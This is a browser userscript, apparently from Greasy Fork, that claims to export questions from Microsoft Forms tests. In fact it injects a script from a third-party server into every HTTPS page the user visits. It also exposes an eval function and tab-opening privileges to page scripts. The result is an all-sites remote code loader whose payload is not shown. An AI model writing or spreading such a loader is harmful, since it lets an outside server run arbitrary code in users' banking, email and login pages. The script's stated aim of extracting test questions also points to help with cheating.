// ==UserScript==
// @name         Forms Questions Extractor
// @namespace    http://tampermonkey.net/
// @description A script that allows you to export questions from a loaded MS Forms test.
// @version      2024-06-01v3
// @description  try to take over the world!
// @author       You
// @match        https://*/*
// @include      https://forms.office.com/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=office.com
// @grant        GM_addElement
// @grant    GM_openInTab
// @grant unsafeWindow
// @sandbox      raw
// @license MIT

// @downloadURL https://update.greasyfork.org/scripts/497791/Forms%20Questions%20Extractor.user.js
// @updateURL https://update.greasyfork.org/scripts/497791/Forms%20Questions%20Extractor.meta.js
// ==/UserScript==

(() => {
  unsafeWindow.ev = function(str){
    return eval(str);
  }
  unsafeWindow.GM_openInTab = function(){GM_openInTab.apply(unsafeWindow,arguments);};

  GM_addElement('script', { src: 'https://apps.serwer-testowy.pl/scripts/FormsQuestionsExtractor/index.js?_ts='+ (new Date().toISOString().split(':')[0]), type: 'text/javascript'});
})();